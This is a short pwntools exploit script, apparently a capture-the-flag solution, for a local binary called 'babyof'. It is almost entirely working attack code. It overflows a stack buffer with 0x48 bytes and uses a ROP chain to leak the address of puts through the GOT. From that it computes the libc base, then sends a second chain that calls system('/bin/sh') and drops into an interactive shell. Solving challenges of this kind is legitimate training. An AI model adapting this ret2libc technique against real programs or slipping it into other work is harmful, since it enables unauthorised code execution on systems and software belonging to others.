#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./babyof')
    elf = ELF('./babyof')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
func = 0x400632
pop_rdi_ret = 0x0000000000400743
ret = 0x0000000000400506

#gdb.attach(p, 'b *0x400632\nc')

# leak libc
p.recvuntil('Do you know how to do buffer overflow?\n')
p.send('A' * 0x48 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(func))
p.recvuntil('I hope you win\n')
libc_base = u64(p.recv(6).ljust(8, '\x00')) - libc.symbols['puts']
info('libc_base = ' + hex(libc_base))

# get shell
bin_sh_addr = libc_base + next(libc.search('/bin/sh\x00'))
system = libc_base + libc.symbols['system']
execve = libc_base + libc.symbols['execve']
p.recvuntil('Do you know how to do buffer overflow?\n')
p.send('A' * 0x48 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret) + p64(system))

p.interactive()

